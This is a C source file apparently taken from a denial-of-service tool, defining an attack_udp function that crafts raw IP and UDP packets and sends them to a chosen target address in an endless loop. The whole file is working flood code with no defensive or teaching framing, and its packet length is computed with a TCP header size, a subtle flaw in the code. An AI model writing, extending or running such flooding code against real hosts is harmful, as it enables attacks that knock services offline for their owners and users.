#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <errno.h>
#include <time.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include "udp_attack.h"
#include "packet.h"
#include "utils.h"
#include "types.h"

void attack_udp(struct target_data *target)
{
	char buffer[BUFFER_SIZE];
	struct ip_hdr *iph = (struct ip_hdr *)buffer;
	struct udp_hdr *udph = (struct udp_hdr *)(buffer + sizeof(struct ip_hdr));
	struct sockaddr_in target_addr;

	seed_rand(time(NULL));

	target_addr.sin_family = AF_INET;
	target_addr.sin_port = target->port == 0 ? 0 : htons(target->port);
	target_addr.sin_addr.s_addr = target->address;
	target->sockfd = init_socket(IPPROTO_UDP);

	while (1) {
		build_ip(iph, sizeof(struct ip_hdr) + sizeof(struct tcp_hdr),
			IPPROTO_UDP, target->address);
		build_udp(iph, udph, target->port);

		if (sendto(target->sockfd, buffer, iph->length, 0,
				(struct sockaddr *)&target_addr,
				sizeof(struct sockaddr_in)) == -1) {
			fprintf(stderr, "%serror while sending packet : %s\n%s",
				COLOR_RED, strerror(errno), COLOR_RESET);
			exit(EXIT_FAILURE);
		}
	}
}
